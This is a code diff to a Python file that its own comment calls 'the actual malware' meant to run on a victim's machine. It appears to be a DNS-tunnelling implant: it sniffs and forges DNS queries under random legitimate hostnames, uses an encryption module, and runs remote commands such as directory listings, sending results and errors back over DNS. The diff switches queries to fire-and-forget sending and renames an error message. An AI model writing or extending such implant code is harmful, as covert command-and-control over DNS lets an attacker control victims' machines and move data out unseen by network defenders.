@@ -1,5 +1,5 @@
 # This will contain the code which will run on the victim. i.e. the actual malware
-from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, sr1
+from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
 from encryption import StreamEncryption
 from shell import LIST
 import os
@@ -30,9 +30,8 @@ def get_random_hostname():
     return hostnames[index]
 
 def send_dns_query(query):
-    # Send the query and wait for response.
-    response = sr1(query)
-    print(response.show())
+    # Send the query.
+    send(query)
 
 def forge_dns_query(data: str):
     # Choose random legitimate hostname.
@@ -74,7 +73,7 @@ def packet_handler(pkt):
                 contents = list_directory(argv[1])
             except DirectoryNotFound:
                 # Send error message back.
-                query = forge_dns_query(data="ERROR")
+                query = forge_dns_query(data="ERRORMSG")
                 send_dns_query(query)
                 print("Directory not found.")
                 return
